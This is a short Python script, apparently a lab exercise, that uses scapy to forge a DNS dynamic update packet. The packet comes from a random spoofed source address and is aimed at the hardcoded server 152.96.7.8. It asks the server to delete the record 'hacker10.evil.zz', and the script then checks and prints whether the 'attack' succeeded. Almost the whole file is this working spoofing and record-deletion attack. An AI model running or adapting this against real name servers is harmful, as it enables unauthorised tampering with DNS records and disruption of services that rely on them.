import sys
from faker import Faker
from scapy.all import *
from scapy.layers.dns import *
from scapy.layers.inet import IP, ICMP, TCP


faker = Faker()

# IP
src = faker.ipv4()
dst = "152.96.7.8"

# UDP
sport = 5353
dport = 53

# DNS
rr = "hacker10.evil.zz"
zone = rr[rr.find(".") + 1:]

def isRecordPresent(ns, dns):
    answer = sr1(IP(dst=ns)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=dns)),verbose=0)
    return hasattr(answer[DNS].an, "rdata")

# https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml#dns-parameters-4
# TYPE: ANY = * = 255
# Class: ANY = * = 255

p=IP(src=src, dst=dst) / UDP(sport=sport, dport=dport) / DNS(
        opcode=5,
        rd=0,
        qd=[DNSQR(qname=zone, qtype="SOA")], 
        an=[DNSRR(rrname=rr, type=255, rclass="ANY", ttl=0, rdata="")],
        ns=[DNSRR(rrname=rr, type=255, rclass="ANY", ttl=0, rdata="")])

send(p)
if not isRecordPresent(dst, rr):
    print("Attack successful")
else:
    print("Attack failed")
